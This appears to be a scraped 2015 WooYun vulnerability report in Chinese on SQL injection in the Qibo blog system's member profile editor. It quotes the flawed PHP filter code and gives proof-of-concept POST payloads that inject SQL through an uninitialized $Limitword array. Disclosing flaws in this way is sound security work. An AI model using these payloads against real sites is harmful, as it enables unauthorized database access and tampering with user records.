{"id": 32068, "wybug_id": "wooyun-2015-0112347", "wybug_title": "齐博博客系统sql注入一枚", "wybug_corp": "齐博CMS", "wybug_author": "玉林嘎", "wybug_date": "2015-05-06 16:13", "wybug_open_date": "2015-08-06 11:38", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-05-06：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-05-08：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-05-11：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-07-02：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-07-12：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-07-22：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-08-06：\t细节向公众公开  简要描述： 遗留问题 还是求个首页呗 详细说明：   WooYun: 齐博整站/地方门户SQL注入漏洞 跟P牛 之前提交的整站系统的漏洞一模一样 代码都没改变/member/userinfo.php\n$truename=replace_bad_word($truename);\t\t$introduce=replace_bad_word($introduce);\t\t$address=replace_bad_word($address);\t\tif($cityid)\t\t{\t\t\t@extract($db->get_one(\"SELECT fup AS provinceid FROM {$pre}area WHERE fid='$cityid'\"));\t\t}\t\t\t\t$array=array(\t\t\t\"uid\"=>$lfjuid,\t\t\t\"username\"=>$lfjid,\t\t\t\"email\"=>$email,\t\t\t\"password\"=>$password,\t\t\t\"icon\"=>$icon,\t\t\t\"sex\"=>$sex,\t\t\t\"bday\"=>$bday,\t\t\t\"introduce\"=>$introduce,\t\t\t\"oicq\"=>$oicq,\t\t\t\"msn\"=>$msn,\t\t\t\"homepage\"=>$homepage,\t\t\t\"address\"=>$address,\t\t\t\"postalcode\"=>$postalcode,\t\t\t\"mobphone\"=>$mobphone,\t\t\t\"telephone\"=>$telephone,\t\t\t\"idcard\"=>$idcard,\t\t\t\"truename\"=>$truename,\t\t\t\"provinceid\"=>$provinceid,\t\t\t\"cityid\"=>$cityid,\t\t);\t\tif($lfjdb[email_yz]&&$lfjdb[email]!=$email){\t\t\tif(!$webdb[EditYzEmail]){\t\t\t\tshowerr(\"你不可以再修改邮箱,因为已经审核过了.\");\t\t\t}else{\t\t\t\t$array[email_yz]=0;\t\t\t}\t\t}\t\tif($lfjdb[mob_yz]&&$lfjdb[mobphone]!=$mobphone){\t\t\tif(!$webdb[EditYzMob]){\t\t\t\tshowerr(\"你不可以再修改手机号码,因为已经审核过了.\");\t\t\t}else{\t\t\t\t$array[mob_yz]=0;\t\t\t}\t\t\t\t\t}\t\tif($lfjdb[idcard_yz]&&($lfjdb[idcard]!=$idcard||$lfjdb[truename]!=$truename)){\t\t\tif(!$webdb[EditYzIdcard]){\t\t\t\tshowerr(\"你不可以再修改身份证资料,因为已经审核过了.\");\t\t\t}else{\t\t\t\t$array[idcard_yz]=0;\t\t\t}\t\t\t\t\t}\t\t\t$userDB->edit_user($array);\n依然$truename 依然replace_bad_word()的问题 \n/*过滤不健康的字*/function replace_bad_word($str){\tglobal $Limitword;\t@include_once(ROOT_PATH.\"data/limitword.php\");\tforeach( $Limitword AS $old=>$new){\t\tstrlen($old)>2 && $str=str_replace($old,trim($new),$str);\t}\treturn $str;}\n$Limitword  在全局文件没有unset也没有赋初值直接可引入\\  想看P牛 漏洞   漏洞证明：  URL:http://127.0.0.1/blog1.0/member/userinfo.php?job=editPOST:truename=%0000&Limitword[000]=&step=2&email=123123@qq.com\n\nPOST:truename=%0000&Limitword[000]=&step=2&email=123123@qq.com&provinceid=,address=(select user()) where uid=2%23\n\n\n\n   修复方案：     版权声明：转载请注明来源 玉林嘎@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2015-05-08 11:36 厂商回复： 这个问题，之前有人提出来了。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-05-06 16:19 |    \t\t牛肉包子 \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:64        )\t\t \n  叼    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 5, "Ranks": null}